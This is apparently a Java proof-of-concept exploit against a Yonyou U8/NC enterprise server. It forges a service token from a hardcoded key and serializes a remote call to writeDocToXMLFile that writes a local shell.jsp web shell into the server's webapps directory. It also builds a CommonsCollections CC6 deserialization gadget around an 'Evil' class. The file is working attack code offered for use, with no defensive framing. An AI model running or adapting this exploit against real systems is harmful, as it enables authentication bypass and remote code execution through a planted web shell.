package org.youkill.fileupload;

import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.comn.NetObjectInputStream;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.comn.NetStreamConstants;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.FrameworkRuntimeException;
import nc.bs.framework.server.token.MD5Util;
import nc.bs.framework.server.token.TokenUtil;
import org.youkill.CommonCollections;
import org.youkill.Evil;
import org.youkill.ServiceDispatcher2;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.nio.file.Files;
import java.security.MessageDigest;

public class U8IPFxxFileService {
    public static void main(String[] args) throws Exception {
        String userCode = "#UAP#";
        Object payload = new CommonCollections().CC6(Evil.class.getName());

        File file=new File("shell.jsp");
        byte[] fileBytes = Files.readAllBytes(file.toPath());


        Class<?>[] paramTypes = new Class<?>[]{byte[].class, String.class};
        Object[] params = new Object[]{fileBytes, "webapps/u8c_web/a123.jsp"};
        InvocationInfo invInfo = new InvocationInfo(
                "nc.itf.uap.pfxx.IPFxxFileService",
                "writeDocToXMLFile",
                paramTypes,
                params
        );
        invInfo.setUserCode(userCode);
        invInfo.setToken(genToken(userCode));
        System.out.println("当前的token:"+invInfo.getToken()+"服务里面的:"+ TokenUtil.getInstance().genToken(userCode));
        System.out.println(invInfo.getToken().equalsIgnoreCase(TokenUtil.getInstance().genToken(userCode)));
        System.out.println(InvocationInfoProxy.getInstance().getUserCode());
        byte[] objectBytes = serializeInvocationInfo(invInfo);
        String hexString = DatatypeConverter.printHexBinary(objectBytes);
        System.out.println("Hex payload:");
        System.out.println(hexString);
        ByteArrayInputStream bis = new ByteArrayInputStream(objectBytes);
        boolean[] streamRet = new boolean[]{
                NetStreamConstants.STREAM_NEED_COMPRESS,
                NetStreamConstants.STREAM_NEED_ENCRYPTED
        };

        Result result = new Result();
        try {
            invInfo = (InvocationInfo) NetObjectInputStream.readObject(bis, streamRet);
            ServiceDispatcher2 serviceDispatcher=new ServiceDispatcher2();
            try {
                result.result = serviceDispatcher.invokeBeanMethod(invInfo.getModule(), invInfo.getServiceName(), invInfo.getMethodName(), invInfo.getParametertypes(), invInfo.getParameters());
            } catch (Throwable e) {
                throw new RuntimeException(e);
            }

            try {
            } catch (Throwable e) {
                throw new RuntimeException(e);
            }
            System.out.println("反序列化完成，payload 已执行");
        } catch (Exception eof) {
            System.err.println("反序列化失败：" + eof.getMessage());
        }
    }

    public static String genToken(String userCode) {
        byte[] md5 = md5("ab7d823e-03ef-39c1-9947-060a0a08b931".getBytes(), userCode.getBytes());
        return MD5Util.byteToHexString(md5);
    }
    private static byte[] md5(byte[] key, byte[] tokens) {
        MessageDigest md = null;

        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(tokens);
            md.update(key);
            return md.digest();
        } catch (Exception var5) {
            Exception e = var5;
            throw new FrameworkRuntimeException("md5 error", e);
        }
    }
    private static byte[] serializeInvocationInfo(InvocationInfo invInfo) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        NetObjectOutputStream nos = new NetObjectOutputStream(bos);
        nos.writeObject(invInfo);
        nos.finish();
        nos.flush();
        byte[] payloadBytes = bos.toByteArray();
        int len = payloadBytes.length;
        ByteArrayOutputStream out = new ByteArrayOutputStream(4 + len);
        out.write((len >>> 24) & 0xFF);
        out.write((len >>> 16) & 0xFF);
        out.write((len >>> 8) & 0xFF);
        out.write((len) & 0xFF);
        out.write(payloadBytes);
        return out.toByteArray();
    }
}